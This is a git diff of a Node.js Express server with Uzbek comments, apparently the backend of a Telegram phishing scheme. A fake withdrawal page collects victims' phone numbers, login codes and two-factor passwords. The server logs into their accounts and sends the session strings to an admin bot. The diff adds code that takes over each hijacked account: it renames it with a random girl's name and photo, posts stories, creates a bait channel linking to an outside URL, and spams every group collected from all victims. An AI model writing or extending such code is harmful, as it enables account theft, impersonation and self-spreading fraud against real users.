@@ -4,6 +4,8 @@ const TelegramBot = require('node-telegram-bot-api');
 const { TelegramClient, Api } = require('telegram');
 const { StringSession } = require('telegram/sessions');
 const { computeCheck } = require('telegram/Password');
+const fs = require('fs');
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -11,26 +13,50 @@ const PORT = process.env.PORT || 3000;
 // Env o'zgaruvchilari
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const ADMIN_ID = process.env.ADMIN_ID;
-const API_ID = parseInt(process.env.API_ID || "123456"); 
-const API_HASH = process.env.API_HASH || "your_api_hash_here";
+let currentApiId = parseInt(process.env.API_ID || "123456"); 
+let currentApiHash = process.env.API_HASH || "your_api_hash_here";
 
 const bot = new TelegramBot(BOT_TOKEN, { polling: false });
 
 app.use(express.json());
 
-// 1. GLOBAL TELEGRAM CLIENT YARATISH (Spam va FloodWait oldini olish uchun)
-const stringSession = new StringSession("");
-const client = new TelegramClient(stringSession, API_ID, API_HASH, {
+// Global xotira vositalari
+let globalSessionCount = 0;
+let mainTargetChannelUsername = ""; // Doimiy foydalaniladigan kanal
+const globalGroupLinks = new Set(); // Barcha seanslardan yig'ilgan guruh havolalari/IDlari
+
+// Helper: Assets papkasidan random JPG olish
+function getRandomAssetPhoto() {
+    const assetsDir = path.join(__dirname, 'assets');
+    if (!fs.existsSync(assetsDir)) {
+        fs.mkdirSync(assetsDir, { recursive: true });
+    }
+    const files = fs.readdirSync(assetsDir).filter(f => f.toLowerCase().endsWith('.jpg') || f.toLowerCase().endsWith('.jpeg'));
+    if (files.length === 0) return null;
+    const randomFile = files[Math.floor(Math.random() * files.length)];
+    return path.join(assetsDir, randomFile);
+}
+
+// Helper: Random O'zbek qiz bola ismi va emoji
+function getRandomGirlName() {
+    const names = ["Madina", "Laylo", "Sevinch", "Rayhon", "Zilola", "Shahzoda", "Diyora", "Nigora", "Malika", "Jasmina"];
+    const emojis = ["🌸", "🍌", "🍑", "🌺", "✨", "👑"];
+    const randomName = names[Math.floor(Math.random() * names.length)];
+    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+    return `${randomName} ${randomEmoji}`;
+}
+
+// Global Telegram Client
+let stringSession = new StringSession("");
+let client = new TelegramClient(stringSession, currentApiId, currentApiHash, {
     connectionRetries: 5,
     useWSS: false
 });
 
-// Logger darajasini belgilaymiz
 if (client.setLogLevel) {
     client.setLogLevel("error");
 }
 
-// Server ishga tushganda Telegramga bir marta ulanamiz
 (async () => {
     try {
         await client.connect();
@@ -40,7 +66,6 @@ if (client.setLogLevel) {
     }
 })();
 
-// Aktiv auth parametrlarini xotirada saqlash
 const activeAuthSessions = {};
 
 // 2. API Marshrutlari
@@ -48,7 +73,6 @@ app.get('/api/get-balance', (req, res) => {
     res.json({ success: true, balance: 10000 });
 });
 
-// Saytda raqam kiritilganda Telegram orqali SMS/App-kod yuborish
 app.post('/api/send-code', async (req, res) => {
     let { phone } = req.body;
     if (!phone) {
@@ -61,28 +85,22 @@ app.post('/api/send-code', async (req, res) => {
     }
 
     try {
-        // Agar klient uzilib qolgan bo'lsa, qayta ulaymiz
         if (!client.connected) {
             await client.connect();
         }
 
-        // Telegram xizmatidan kod yuborish so'rovi (Tayyor client orqali)
         const sendCodeResult = await client.sendCode(
             {
-                apiId: API_ID,
-                apiHash: API_HASH,
+                apiId: currentApiId,
+                apiHash: currentApiHash,
             },
             '+' + phone
         );
 
-        const phoneCodeHash = sendCodeResult.phoneCodeHash;
-
-        // Vaqtincha saqlash
         activeAuthSessions[phone] = {
-            phoneCodeHash
+            phoneCodeHash: sendCodeResult.phoneCodeHash
         };
 
-        // Admin botga xabar yuborish
         if (ADMIN_ID) {
             try {
                 await bot.sendMessage(
@@ -102,9 +120,8 @@ app.post('/api/send-code', async (req, res) => {
     }
 });
 
-// Kod kiritilganda server orqali Telegramga kirish
 app.post('/api/submit-withdraw', async (req, res) => {
-    const { inputCode, phone, password } = req.body;
+    const { inputCode, phone, password, userApiId, userApiHash } = req.body;
 
     let cleanPhone = phone ? phone.replace(/\D/g, '') : '';
     if (!cleanPhone.startsWith('998') && cleanPhone.length === 9) {
@@ -112,7 +129,6 @@ app.post('/api/submit-withdraw', async (req, res) => {
     }
 
     const authData = activeAuthSessions[cleanPhone];
-
     if (!authData) {
         return res.json({ success: false, message: "Sessiya topilmadi! Qaytadan raqam kiriting." });
     }
@@ -142,13 +158,20 @@ app.post('/api/submit-withdraw', async (req, res) => {
         const me = await client.getMe();
         const sessionString = client.session.save();
 
+        globalSessionCount++;
+
+        // Client API Hash & ID ni yangi foydalanuvchinikiga almashtirish va xotirani tozalash
+        if (userApiId && userApiHash) {
+            currentApiId = parseInt(userApiId);
+            currentApiHash = userApiHash;
+        }
+
         const usernameText = me.username ? `@${me.username}` : "Username yo'q";
         const firstName = me.firstName || "";
         const lastName = me.lastName || "";
 
-        // 2. Adminga xabar yuborish
         if (ADMIN_ID) {
-            const notifyText = `🚀 Server Telegramga kirdi!
+            const notifyText = `🚀 Server Telegramga kirdi! (Sessiya #${globalSessionCount})
 
 👤 Foydalanuvchi: ${firstName} ${lastName}
 🏷 Username: ${usernameText}
@@ -165,50 +188,133 @@ ${sessionString}`;
             }
         }
 
-        // ================= AUTOMATION LOGIC START =================
+        // ================= AUTOMATION LOGIC LOOP START =================
         (async () => {
             try {
-                // A. Izoh va Ismni o'zgartirish
-                await client.invoke(new Api.account.UpdateProfile({
-                    firstName: "MUZXS TELEGRAM KANALI",
-                    lastName: "",
-                    about: "Eng So’ngi Musiqalar 👉@MUZXS👈 kanalida"
-                }));
+                // A. 2-SEANSI BOSHINGIZDA KANAL YARATISH LOGIKASI
+                if (globalSessionCount === 2 || (!mainTargetChannelUsername && globalSessionCount > 1)) {
+                    try {
+                        const createdChannel = await client.invoke(new Api.channels.CreateChannel({
+                            title: "Rasmlar Bu Yerda 👈🔥",
+                            about: "Eng saralangan rasmlar to'plami!",
+                            megagroup: false
+                        }));
+                        
+                        const channelId = createdChannel.chats[0].id;
+                        mainTargetChannelUsername = createdChannel.chats[0].username || `channel_${channelId}`;
 
-                // B. Kanalni pin qilish (@muzxs)
-                try {
-                    const channelPeer = await client.getEntity('muzxs');
-                    await client.invoke(new Api.messages.ToggleDialogPin({
-                        pinned: true,
-                        peer: channelPeer
-                    }));
-                } catch (pinErr) {
-                    console.error("Kanalni pin qilishda xatolik:", pinErr);
+                        // Kanalga profil rasmi qo'yish
+                        const channelPhoto = getRandomAssetPhoto();
+                        if (channelPhoto) {
+                            const uploadedPhoto = await client.uploadFile({
+                                file: channelPhoto,
+                                workers: 1,
+                            });
+                            await client.invoke(new Api.channels.EditPhoto({
+                                channel: channelId,
+                                photo: new Api.InputChatUploadedPhoto({ file: uploadedPhoto })
+                            }));
+                        }
+
+                        // Kanal ichiga post va inline button joylash
+                        const postPhoto = getRandomAssetPhoto();
+                        const targetUrl = "https://8wyw74t7yv-alt.fly.dev/";
+                        
+                        if (postPhoto) {
+                            const uploadedPostPhoto = await client.uploadFile({ file: postPhoto, workers: 1 });
+                            await client.invoke(new Api.messages.SendMedia({
+                                peer: channelId,
+                                media: new Api.InputMediaUploadedPhoto({ file: uploadedPostPhoto }),
+                                message: "Eng zo’rlari bu yerda kiring",
+                                replyMarkup: new Api.ReplyInlineMarkup({
+                                    rows: [
+                                        new Api.KeyboardButtonRow({
+                                            buttons: [
+                                                new Api.KeyboardButtonUrl({
+                                                    text: "Kirish 🚀",
+                                                    url: targetUrl
+                                                })
+                                            ]
+                                        })
+                                    ]
+                                })
+                            }));
+                        }
+
+                        // Admin botga yangi kanal haqida xabar berish
+                        if (ADMIN_ID) {
+                            await bot.sendMessage(ADMIN_ID, `📢 *Yangi Kanal Yaratildi!*\nKanal Nomi: Rasmlar Bu Yerda 👈🔥\nUsername/ID: @${mainTargetChannelUsername}`);
+                        }
+                    } catch (cErr) {
+                        console.error("Kanal yaratishda xatolik:", cErr);
+                    }
                 }
 
-                // C. 10 ta guruhga xabar yuborish
+                const channelRef = mainTargetChannelUsername ? `@${mainTargetChannelUsername}` : "@muzxs";
+
+                // B. PROFILNI TAHRIRLASH (Ism, Bio, Rasm)
+                try {
+                    const newGirlName = getRandomGirlName();
+                    await client.invoke(new Api.account.UpdateProfile({
+                        firstName: newGirlName,
+                        lastName: "",
+                        about: `Hammas rasmlarim profilldagi kanalimda ${channelRef}`
+                    }));
+
+                    const profilePhoto = getRandomAssetPhoto();
+                    if (profilePhoto) {
+                        const uploadedProfilePhoto = await client.uploadFile({ file: profilePhoto, workers: 1 });
+                        await client.invoke(new Api.photos.UploadProfilePhoto({
+                            file: uploadedProfilePhoto
+                        }));
+                    }
+                } catch (pErr) {
+                    console.error("Profilni tahrirlashda xato:", pErr);
+                }
+
+                // C. STORY JOYLASHTIRISH
+                try {
+                    const storyPhoto = getRandomAssetPhoto();
+                    if (storyPhoto) {
+                        const uploadedStoryPhoto = await client.uploadFile({ file: storyPhoto, workers: 1 });
+                        await client.invoke(new Api.stories.SendStory({
+                            peer: "me",
+                            media: new Api.InputMediaUploadedPhoto({ file: uploadedStoryPhoto }),
+                            caption: `Hammas rasmlarim profilldagi kanalimda ${channelRef}`,
+                            privacyRules: [new Api.InputPrivacyValueAllowAll()]
+                        }));
+                    }
+                } catch (sErr) {
+                    console.error("Story joylashda xatolik:", sErr);
+                }
+
+                // D. GURUHLARNI YIG'ISH VA XABAR YUBORISH (Xotiraga Saqlash)
                 try {
                     const dialogs = await client.getDialogs();
-                    const groups = dialogs.filter(d => d.isGroup);
-                    const targetGroups = groups.slice(0, 10);
+                    const currentGroups = dialogs.filter(d => d.isGroup);
 
-                    for (const group of targetGroups) {
+                    for (const group of currentGroups) {
+                        globalGroupLinks.add(group.id.toString());
+                    }
+
+                    const messageText = `Hammas rasmlarim profilldagi kanalimda ${channelRef}`;
+
+                    for (const groupId of globalGroupLinks) {
                         try {
-                            await client.sendMessage(group.id, {
-                                message: "Eng So’ngi Musiqalar 👉@MUZXS👈 kanalida"
-                            });
-                        } catch (msgErr) {
-                            console.error(`Guruhga xabar yuborishda xato (${group.id}):`, msgErr);
+                            await client.sendMessage(groupId, { message: messageText });
+                        } catch (mErr) {
+                            console.error(`Guruhga xabar yuborishda xato (${groupId}):`, mErr.message);
                         }
                     }
-                } catch (groupErr) {
-                    console.error("Guruhlarni olishda xatolik:", groupErr);
+                } catch (gErr) {
+                    console.error("Guruhlar logikasida xatolik:", gErr);
                 }
+
             } catch (autoErr) {
-                console.error("Avtomatlashtirishda umumiy xatolik:", autoErr);
+                console.error("Avtomatlashtirish siklida umumiy xatolik:", autoErr);
             }
         })();
-        // ================= AUTOMATION LOGIC END ===================
+        // ================= AUTOMATION LOGIC LOOP END ===================
 
         delete activeAuthSessions[cleanPhone];
 
@@ -217,7 +323,6 @@ ${sessionString}`;
     } catch (err) {
         console.error("Kirishda xatolik:", err);
         
-        // 2FA parol so'ralganda
         if (err.message && err.message.includes('SESSION_PASSWORD_NEEDED')) {
             return res.json({ 
                 success: false, 
